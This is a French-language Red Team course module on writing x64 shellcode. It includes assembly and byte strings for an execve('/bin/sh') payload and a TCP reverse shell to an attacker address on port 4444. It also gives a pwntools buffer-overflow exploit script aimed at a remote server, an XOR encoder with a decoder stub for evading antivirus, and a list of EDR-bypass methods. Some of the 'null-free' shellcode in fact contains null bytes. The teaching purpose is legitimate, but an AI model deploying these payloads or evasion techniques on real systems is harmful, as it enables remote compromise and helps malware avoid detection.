# 24 - Shellcode x64

## üéØ Ce que tu vas apprendre

Dans ce module, tu vas ma√Ætriser l'art d'√©crire du **shellcode x64**, le code machine optimis√© pour exploiter des binaires. Tu vas apprendre √† g√©n√©rer du code assembleur sans null bytes, √©viter les bad bytes, et cr√©er des shells (bind, reverse). Tu verras √©galement comment encoder ton shellcode pour bypass les antivirus et IDS.

## üìö Th√©orie

### C'est quoi un shellcode ?

Un **shellcode** est une s√©quence de **bytes** (code machine) inject√©e dans la m√©moire d'un processus vuln√©rable pour **ex√©cuter du code arbitraire**. C'est le payload final d'une exploitation.

**Exemple simple :**
```
Shellcode : \x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e...
            ‚îî‚îÄ Code machine qui lance /bin/sh
```

Le terme "shellcode" vient du fait que l'objectif historique √©tait d'obtenir un **shell** (terminal) sur la machine cible.

### Pourquoi √ßa existe ?

Dans les ann√©es 1990, les premi√®res exploitations de buffer overflow permettaient d'√©craser l'adresse de retour d'une fonction pour **rediriger l'ex√©cution vers du code malveillant**.

**Probl√®me :** Comment ex√©cuter du code arbitraire sur une machine distante ?

**Solution :** Injecter directement du **code machine** (shellcode) dans le buffer d√©bord√©, puis faire pointer l'adresse de retour vers ce code.

**√âvolution :**
1. **1990s** : Shellcode simple inject√© sur la stack
2. **2000s** : Introduction de NX/DEP ‚Üí stack non-ex√©cutable ‚Üí naissance du ROP
3. **2010s** : ASLR, PIE, CFI ‚Üí shellcode doit √™tre polymorphe et position-independent
4. **2020s** : Evasion AV/EDR ‚Üí encodage avanc√©, syscalls directs

Aujourd'hui, le shellcode reste **essentiel** pour :
- Exploits binaires (pwn)
- Post-exploitation (C2, implants)
- Red Team (reverse shells, bind shells)

### Comment √ßa marche ?

Un shellcode fonctionne en **3 √©tapes** :

#### 1. Injection

Le shellcode est **inject√©** dans la m√©moire du processus cible via une vuln√©rabilit√© (buffer overflow, format string, use-after-free, etc.).

```
M√©moire avant :
+------------------+
| buffer[100]      |  <- Donn√©es normales
+------------------+

M√©moire apr√®s overflow :
+------------------+
| buffer[100]      |  <- Rempli de shellcode
| \x48\x31\xc0...  |
+------------------+
```

#### 2. Redirection

L'adresse de retour (ou un pointeur de fonction) est **√©cras√©e** pour pointer vers le shellcode.

```
Stack frame :
+------------------+
| Saved RIP        |  <- √âcras√© avec l'adresse du shellcode
+------------------+
| Saved RBP        |
+------------------+
| buffer[100]      |  <- Contient le shellcode
| \x48\x31\xc0...  |
+------------------+
```

#### 3. Ex√©cution

Quand la fonction fait `ret`, le CPU charge l'adresse du shellcode dans `RIP` et **ex√©cute les instructions**.

```
ret instruction :
1. pop rip  (charge l'adresse depuis la stack)
2. rip = adresse du shellcode
3. CPU ex√©cute le shellcode
4. Shell obtenu !
```

### Contraintes du shellcode

Un shellcode doit respecter plusieurs contraintes strictes :

#### 1. Pas de null bytes (\x00)

**Probl√®me :** Beaucoup de vuln√©rabilit√©s utilisent des fonctions de string (`strcpy`, `scanf`, etc.) qui **s'arr√™tent au premier \x00**.

```c
strcpy(buffer, shellcode);
// S'arr√™te au premier \x00 ‚Üí shellcode tronqu√©
```

**Solution :** Utiliser des techniques pour √©viter les null bytes :
- `xor rax, rax` au lieu de `mov rax, 0`
- `push 59; pop rax` au lieu de `mov rax, 59`
- Utiliser les registres 8/16/32 bits quand possible

#### 2. Pas de bad bytes

Certaines applications filtrent des bytes sp√©cifiques :
- `\x0a` (newline)
- `\x0d` (carriage return)
- `\x20` (espace)
- Caract√®res alphanum√©riques uniquement (shellcode alphanum√©rique)

#### 3. Position-independent

Le shellcode doit fonctionner **quelle que soit l'adresse** o√π il est charg√© (√† cause d'ASLR).

**Techniques :**
- Utiliser des adresses relatives (`lea rdi, [rel string]`)
- Construire les strings sur la stack (push/pop)
- Utiliser `call/pop` pour obtenir l'adresse courante

#### 4. Taille minimale

Plus le shellcode est petit, plus il est facile √† injecter :
- Buffer de 64 bytes ‚Üí shellcode de 50 bytes max
- Reverse shell minimal : ~30 bytes

### Les syscalls en x64

Un shellcode invoque des **syscalls** pour interagir avec le kernel.

**Convention x64 (System V AMD64 ABI) :**
- **RAX** : Num√©ro du syscall
- **RDI** : 1er argument
- **RSI** : 2√®me argument
- **RDX** : 3√®me argument
- **R10** : 4√®me argument
- **R8** : 5√®me argument
- **R9** : 6√®me argument

**Syscalls essentiels :**

| Syscall | RAX | RDI | RSI | RDX | Description |
|---------|-----|-----|-----|-----|-------------|
| `read` | 0 | fd | buf | count | Lire des donn√©es |
| `write` | 1 | fd | buf | count | √âcrire des donn√©es |
| `open` | 2 | filename | flags | mode | Ouvrir un fichier |
| `close` | 3 | fd | - | - | Fermer un fd |
| `socket` | 41 | domain | type | protocol | Cr√©er un socket |
| `connect` | 42 | sockfd | addr | addrlen | Se connecter |
| `execve` | 59 | filename | argv | envp | Ex√©cuter un programme |
| `dup2` | 33 | oldfd | newfd | - | Dupliquer un fd |

**Invocation d'un syscall :**
```asm
mov rax, 59         ; Syscall execve
mov rdi, addr_sh    ; "/bin/sh"
xor rsi, rsi        ; NULL
xor rdx, rdx        ; NULL
syscall             ; Invoque le kernel
```

### √âcrire du shellcode sans null bytes

Voici les techniques pour √©viter les null bytes :

#### Technique 1 : XOR pour z√©ro

```asm
; MAUVAIS (contient \x00) :
mov rax, 0          ; \x48\xc7\xc0\x00\x00\x00\x00

; BON (pas de \x00) :
xor rax, rax        ; \x48\x31\xc0
```

#### Technique 2 : Push/Pop

```asm
; MAUVAIS :
mov rax, 59         ; Peut contenir des \x00

; BON :
push 59             ; \x6a\x3b
pop rax             ; \x58
```

#### Technique 3 : Registres 8/16/32 bits

```asm
; MAUVAIS :
mov rax, 59         ; \x48\xc7\xc0\x3b\x00\x00\x00

; BON :
xor eax, eax        ; EAX = 0 (zero-extend to RAX)
mov al, 59          ; AL = 59 (partie basse de RAX)
                    ; RAX = 59
```

**Astuce :** Modifier un registre 32 bits (EAX) **zero-extend** automatiquement vers 64 bits (RAX).

#### Technique 4 : Construction de strings sur la stack

```asm
; Stocker "/bin/sh" sur la stack
xor rax, rax            ; \x00 terminator
push rax                ; Push null byte

; "/bin/sh" = 7 bytes, on ajoute "/" pour faire 8 bytes
; "//bin/sh" en little-endian :
; 0x68732f6e69622f2f

mov rbx, 0x68732f6e69622f2f
push rbx                ; Push la string

mov rdi, rsp            ; RDI = pointeur vers "/bin/sh"
```

**Explication de little-endian :**
```
Bytes en m√©moire (little-endian) :
[adresse basse] 0x2f 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 [adresse haute]
                 /    /    b    i    n    /    s    h

Lecture : //bin/sh
```

## üîç Visualisation

### Architecture d'un exploit avec shellcode

```
AVANT L'EXPLOITATION
====================

Programme vuln√©rable :
void vuln(char *input) {
    char buffer[128];
    strcpy(buffer, input);  ‚Üê Vuln√©rabilit√©
}

Stack :
+------------------+  <- Adresses basses
| Return Address   |  0x7fffffffe100
+------------------+
| Saved RBP        |  0x7fffffffe0f8
+------------------+
| buffer[128]      |  0x7fffffffe078
| (vide)           |
+------------------+  <- Adresses hautes


PENDANT L'EXPLOITATION
=======================

Payload envoy√© :
[ NOP sled (100 bytes) ][ Shellcode (28 bytes) ][ Adresse retour (8 bytes) ]

Stack apr√®s overflow :
+------------------+  <- Adresses basses
| 0x7fffffffe090   |  ‚Üê Adresse de retour √©cras√©e (pointe vers NOP sled)
+------------------+
| 0x4141414141     |  ‚Üê Saved RBP √©cras√© (padding)
+------------------+
| \x90\x90\x90...  |  ‚Üê NOP sled (100 bytes)
| \x90\x90\x90...  |
| \x90\x90\x90...  |
| \x48\x31\xc0...  |  ‚Üê Shellcode (28 bytes)
| \x50\x48\xbb...  |
+------------------+


EX√âCUTION DU SHELLCODE
======================

√âtape 1 : Return de la fonction
  ret instruction charge 0x7fffffffe090 dans RIP

√âtape 2 : Glissement dans le NOP sled
  CPU ex√©cute \x90 \x90 \x90... (NOP = no operation)
  RIP avance jusqu'au shellcode

√âtape 3 : Ex√©cution du shellcode
  \x48\x31\xc0  ‚Üí xor rax, rax
  \x50          ‚Üí push rax
  \x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68 ‚Üí mov rbx, "//bin/sh"
  \x53          ‚Üí push rbx
  \x48\x89\xe7  ‚Üí mov rdi, rsp
  ...
  \x0f\x05      ‚Üí syscall (execve)

√âtape 4 : Shell obtenu
  execve("/bin/sh", NULL, NULL)
  ‚Üí /bin/sh s'ex√©cute
  ‚Üí Attaquant contr√¥le le processus
```

### Flow d'un shellcode execve("/bin/sh")

```
INSTRUCTIONS                 REGISTRES              STACK
============                 =========              =====

xor rax, rax                RAX = 0x0000000000000000
push rax                    RSP = 0x7fff0100        [0x00] (null terminator)

mov rbx, 0x68732f6e69622f2f RBX = 0x68732f6e69622f2f
push rbx                    RSP = 0x7fff00f8        [0x2f][0x2f][0x62][0x69]
                                                    [0x6e][0x2f][0x73][0x68]
                                                    [0x00]
                                                     |
                                                     ‚Üì "//bin/sh\0"

mov rdi, rsp                RDI = 0x7fff00f8 (pointeur vers "//bin/sh")

xor rsi, rsi                RSI = 0x0000000000000000 (NULL)

xor rdx, rdx                RDX = 0x0000000000000000 (NULL)

push 59                     RSP = 0x7fff00f0        [59]
pop rax                     RAX = 59 (syscall execve)

syscall                     Kernel invoqu√©
                            ‚Üì
                            execve("/bin/sh", NULL, NULL)
                            ‚Üì
                            Shell lanc√© !
```

## üíª Exemple pratique

### Shellcode 1 : execve("/bin/sh")

**Code assembleur :**
```asm
; execve("/bin/sh", NULL, NULL)
; Fichier : shellcode_execve.asm

global _start

section .text
_start:
    ; Construire la string "/bin/sh" sur la stack
    xor rax, rax            ; RAX = 0
    push rax                ; Null terminator

    ; "//bin/sh" en hexa (8 bytes, little-endian)
    mov rbx, 0x68732f6e69622f2f
    push rbx                ; Push la string sur la stack

    ; Pr√©parer les arguments
    mov rdi, rsp            ; RDI = adresse de "/bin/sh"
    xor rsi, rsi            ; RSI = NULL
    xor rdx, rdx            ; RDX = NULL

    ; Appeler execve
    push 59                 ; Num√©ro de syscall execve
    pop rax
    syscall
```

**Compilation et extraction :**
```bash
# Assembler
$ nasm -f elf64 shellcode_execve.asm -o shellcode_execve.o

# Linker
$ ld shellcode_execve.o -o shellcode_execve

# Extraire les bytes
$ objdump -d shellcode_execve -M intel

shellcode_execve:     file format elf64-x86-64

Disassembly of section .text:

0000000000401000 <_start>:
  401000: 48 31 c0              xor    rax,rax
  401003: 50                    push   rax
  401004: 48 bb 2f 62 69 6e 2f  movabs rbx,0x68732f6e69622f2f
  40100b: 2f 73 68
  40100e: 53                    push   rbx
  40100f: 48 89 e7              mov    rdi,rsp
  401012: 48 31 f6              xor    rsi,rsi
  401015: 48 31 d2              xor    rdx,rdx
  401018: 6a 3b                 push   0x3b
  40101a: 58                    pop    rax
  40101b: 0f 05                 syscall
```

**Shellcode final (29 bytes) :**
```
\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05
```

**Test du shellcode :**
```c
// test_shellcode.c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main() {
    unsigned char shellcode[] =
        "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e"
        "\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31"
        "\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

    printf("[+] Shellcode size: %ld bytes\n", sizeof(shellcode) - 1);
    printf("[+] Executing shellcode...\n");

    // Allouer m√©moire ex√©cutable
    void *exec = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_ANON | MAP_PRIVATE, -1, 0);

    memcpy(exec, shellcode, sizeof(shellcode));

    // Ex√©cuter
    ((void(*)())exec)();

    return 0;
}
```

**Compilation et ex√©cution :**
```bash
$ gcc test_shellcode.c -o test_shellcode -z execstack
$ ./test_shellcode
[+] Shellcode size: 29 bytes
[+] Executing shellcode...
$ # Shell obtenu !
$ whoami
user
$ exit
```

### Shellcode 2 : Reverse shell TCP

**Objectif :** Se connecter √† l'attaquant (192.168.1.100:4444) et lui donner un shell.

**Code assembleur :**
```asm
; Reverse shell TCP
; Connexion vers 192.168.1.100:4444

global _start

section .text
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    push 41                     ; syscall socket
    pop rax
    push 2                      ; AF_INET
    pop rdi
    push 1                      ; SOCK_STREAM
    pop rsi
    xor rdx, rdx                ; protocol = 0
    syscall                     ; rax = socket fd

    ; Sauvegarder le socket fd
    mov rdi, rax                ; rdi = socket fd

    ; Pr√©parer struct sockaddr_in sur la stack
    xor rax, rax
    push rax                    ; sin_zero (padding)

    ; IP: 192.168.1.100 = 0xc0a80164 (en hexa)
    mov dword [rsp-4], 0x6401a8c0   ; sin_addr (little-endian)

    ; Port: 4444 = 0x115c
    mov word [rsp-6], 0x5c11        ; sin_port (big-endian)

    ; sin_family: AF_INET = 2
    mov word [rsp-8], 0x2           ; sin_family
    sub rsp, 8

    ; connect(sockfd, &addr, addrlen)
    push 42                     ; syscall connect
    pop rax
    mov rsi, rsp                ; rsi = pointeur vers sockaddr_in
    push 16                     ; addrlen = sizeof(sockaddr_in)
    pop rdx
    syscall

    ; dup2(sockfd, 0) - stdin
    push 33                     ; syscall dup2
    pop rax
    xor rsi, rsi                ; newfd = 0 (stdin)
    syscall

    ; dup2(sockfd, 1) - stdout
    push 33
    pop rax
    push 1
    pop rsi                     ; newfd = 1 (stdout)
    syscall

    ; dup2(sockfd, 2) - stderr
    push 33
    pop rax
    push 2
    pop rsi                     ; newfd = 2 (stderr)
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push 59
    pop rax
    syscall
```

**Shellcode extrait (environ 90 bytes) :**
```python
shellcode = (
    b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05"
    b"\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\xc0\xa8\x01\x64"
    b"\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x00\x02"
    b"\x48\x83\xec\x08\x6a\x2a\x58\x48\x89\xe6\x6a\x10\x5a\x0f\x05"
    b"\x6a\x21\x58\x48\x31\xf6\x0f\x05\x6a\x21\x58\x6a\x01\x5e\x0f\x05"
    b"\x6a\x21\x58\x6a\x02\x5e\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62"
    b"\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2"
    b"\x6a\x3b\x58\x0f\x05"
)
```

**Test :**
```bash
# Sur l'attaquant (192.168.1.100) :
$ nc -lvnp 4444
Listening on 0.0.0.0 4444

# Sur la cible :
$ ./reverse_shell_shellcode

# Sur l'attaquant :
Connection received on 192.168.1.50 45678
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ # Shell obtenu !
```

## üéØ Application Red Team

### Sc√©nario : Exploitation d'un serveur distant

**Contexte :**
- Serveur web avec une vuln√©rabilit√© de buffer overflow
- Port 80 ouvert, firewall bloque les connexions entrantes
- Besoin d'un reverse shell pour bypass le firewall

**√âtapes :**

#### 1. Identifier la vuln√©rabilit√©

```bash
# Fuzzing pour trouver l'offset
$ python3 -c "print('A' * 200)" | nc target.com 80
# Crash d√©tect√© ‚Üí offset √† trouver
```

#### 2. Cr√©er le payload

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
target_ip = "target.com"
target_port = 80
attacker_ip = "10.0.0.5"  # Notre IP publique
attacker_port = 4444

# Shellcode reverse shell (personnalis√© pour notre IP)
# IP: 10.0.0.5 = 0x0a000005
shellcode = (
    b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05"
    b"\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x0a\x00\x00\x05"  # IP modifi√©e
    b"\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x00\x02"
    b"\x48\x83\xec\x08\x6a\x2a\x58\x48\x89\xe6\x6a\x10\x5a\x0f\x05"
    b"\x6a\x21\x58\x48\x31\xf6\x0f\x05\x6a\x21\x58\x6a\x01\x5e\x0f\x05"
    b"\x6a\x21\x58\x6a\x02\x5e\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62"
    b"\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2"
    b"\x6a\x3b\x58\x0f\x05"
)

# Payload
offset = 136
nop_sled = b"\x90" * 100
shellcode_addr = 0x7fffffffe080  # Adresse approximative (NOP sled permet la marge)

payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))
payload += p64(shellcode_addr)

# Lancer le listener
print("[+] D√©marrer le listener : nc -lvnp 4444")
input("[+] Appuyez sur Entr√©e quand pr√™t...")

# Envoyer le payload
io = remote(target_ip, target_port)
io.sendline(payload)
io.close()

print("[+] Payload envoy√© ! V√©rifier le listener.")
```

#### 3. Recevoir le shell

```bash
# Terminal 1 : Listener
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on target.com 54321
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux target 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
$ # Acc√®s obtenu !
```

### Cas r√©el : Encodage pour bypass AV

Si un antivirus d√©tecte le shellcode, on peut l'encoder :

**Encoder avec XOR :**
```python
#!/usr/bin/env python3

# Shellcode original
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

# Cl√© XOR
key = 0xAA

# Encoder
encoded = bytes([b ^ key for b in shellcode])
print(f"Encoded: {encoded.hex()}")

# Decoder stub (√† inclure avant le shellcode encod√©)
decoder_stub = (
    b"\xeb\x0e"                      # jmp short call_decoder
    b"\x5e"                          # pop rsi (adresse du shellcode)
    b"\x48\x31\xc9"                  # xor rcx, rcx
    b"\xb1" + bytes([len(shellcode)])  # mov cl, length
    b"\x80\x36\xaa"                  # xor byte [rsi], 0xaa
    b"\x48\xff\xc6"                  # inc rsi
    b"\xe2\xf8"                      # loop decode_loop
    b"\xeb\x05"                      # jmp short shellcode
    b"\xe8\xed\xff\xff\xff"          # call decoder_stub
    + encoded                        # Shellcode encod√©
)
```

**R√©sultat :** L'AV ne d√©tecte plus le shellcode car les signatures ne matchent pas.

## üõ°Ô∏è Protections et bypass

### Protection : DEP/NX (Data Execution Prevention)

**M√©canisme :**
- Marque la stack et heap comme **non-ex√©cutables**
- Toute tentative d'ex√©cuter du code sur ces zones provoque un SIGSEGV

**Bypass :**
1. **ROP (Return-Oriented Programming)** : R√©utiliser du code existant
2. **ret2libc** : Appeler des fonctions dangereuses (system, execve)
3. **mprotect()** : Utiliser un gadget ROP pour rendre la stack ex√©cutable
4. **Injection dans une zone RWX** : Chercher des segments d√©j√† ex√©cutables

### Protection : ASLR (Address Space Layout Randomization)

**M√©canisme :**
- Randomise les adresses de la stack, heap, libc √† chaque ex√©cution

**Bypass :**
1. **Information leak** : Exploiter une vuln√©rabilit√© pour leak une adresse
2. **NOP sled** : Augmenter la surface d'attaque
3. **Bruteforce** : Sur 32 bits, l'entropie est limit√©e
4. **Partial overwrite** : √âcraser seulement les bytes de poids faible

### Protection : CFI (Control Flow Integrity)

**M√©canisme :**
- V√©rifie que les sauts indirects pointent vers des adresses valides

**Bypass :**
- Utiliser des gadgets l√©gitimes
- Exploiter des failles dans l'impl√©mentation du CFI

### Protection : Antivirus/EDR

**M√©canisme :**
- D√©tection par signatures
- D√©tection comportementale (hooks, syscalls)

**Bypass :**
1. **Encodage** : XOR, ROT, AES
2. **Polymorphisme** : G√©n√©rer un shellcode diff√©rent √† chaque fois
3. **Syscalls directs** : Bypass les hooks en invoquant directement le kernel
4. **Sleep/Delay** : Retarder l'ex√©cution pour √©viter les sandboxes

## üìù Points cl√©s

1. **Shellcode = code machine inject√©** dans un processus pour ex√©cuter du code arbitraire

2. **Contraintes strictes :**
   - Pas de null bytes (\x00)
   - Pas de bad bytes (d√©pend du contexte)
   - Position-independent
   - Taille minimale

3. **Techniques pour √©viter null bytes :**
   - `xor rax, rax` au lieu de `mov rax, 0`
   - `push/pop` pour charger des valeurs
   - Utiliser les registres 8/16/32 bits
   - Construire les strings sur la stack

4. **Types de shellcode :**
   - **Bind shell** : √âcoute sur un port
   - **Reverse shell** : Se connecte vers l'attaquant
   - **Staged** : Petit loader + payload gros
   - **Stageless** : Tout-en-un

5. **Syscalls essentiels en x64 :**
   - `execve` (59) : Ex√©cuter un programme
   - `socket` (41), `connect` (42), `bind` (49), `listen` (50), `accept` (43)
   - `dup2` (33) : Rediriger stdin/stdout/stderr
   - `read` (0), `write` (1)

6. **Convention d'appel x64 :**
   - RAX : num√©ro de syscall
   - RDI, RSI, RDX, R10, R8, R9 : arguments

7. **NOP sled (\x90)** : Augmente la probabilit√© de toucher le shellcode

8. **Encodage** : XOR, polymorphisme pour bypass AV/EDR

9. **Protection moderne = DEP + ASLR + CFI** ‚Üí combinaison de techniques n√©cessaire

## ‚û°Ô∏è Prochaine √©tape

Maintenant que tu ma√Ætrises le shellcode x64, tu vas d√©couvrir les **vuln√©rabilit√©s de format string** dans le module 25. Tu apprendras √† exploiter `printf()` et `scanf()` pour lire/√©crire de la m√©moire arbitraire, leak des adresses, et prendre le contr√¥le du programme.
